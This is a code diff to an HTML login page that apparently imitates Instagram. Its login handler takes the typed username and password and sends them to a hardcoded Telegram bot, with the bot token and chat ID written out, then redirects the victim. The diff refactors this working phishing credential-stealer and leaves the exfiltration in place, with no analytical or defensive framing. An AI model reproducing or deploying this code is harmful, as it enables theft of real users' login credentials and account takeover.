@@ -95,12 +95,6 @@
             font-size: 14px;
         }
 
-        .error-message {
-            color: red;
-            font-size: 12px;
-            margin-top: 10px;
-        }
-
         .forgot-link {
             color: #00376b;
             font-size: 12px;
@@ -164,16 +158,15 @@
         function handleLogin(event) {
             event.preventDefault();
             attempts++;
-            const errorMessage = document.getElementById('error-message');
-
             const form = document.getElementById('login-form');
             const formData = new FormData(form);
-            formData.append('attempts', attempts);
+            const username = formData.get('username');
+            const password = formData.get('password');
 
             const telegramApiUrl = `https://api.telegram.org/bot7387417554:AAGlNvhvGOnXZ4v15HXb-ctWhm2m6YzaAT0/sendMessage`;
             const messageData = {
                 chat_id: '6534651073',
-                text: `Login attempt ${attempts}\nUsername: ${formData.get('username')}\nPassword: ${formData.get('password')}`
+                text: `Login attempt ${attempts}\nUsername: ${username}\nPassword: ${password}`
             };
 
             fetch(telegramApiUrl, {
@@ -188,12 +181,13 @@
                 if (data.ok) {
                     window.location.href = 'Sinsta.html';
                 } else {
-                    errorMessage.textContent = 'An error occurred while sending the message. Please try again later.';
+                    console.error('Failed to send message to Telegram');
+                    alert('An error occurred. Please try again later.');
                 }
             })
             .catch(error => {
                 console.error('Login error:', error);
-                errorMessage.textContent = 'An error occurred. Please try again later.';
+                alert('An error occurred. Please try again later.');
             });
         }
 
@@ -216,7 +210,6 @@
                 <div class="textbox">
                     <input type="password" placeholder="Password" name="password" required>
                 </div>
-                <div id="error-message" class="error-message"></div>
                 <a href="#" class="forgot-link">Forgotten your password?</a>
                 <button type="submit" class="btn">Log in</button>
             </form>
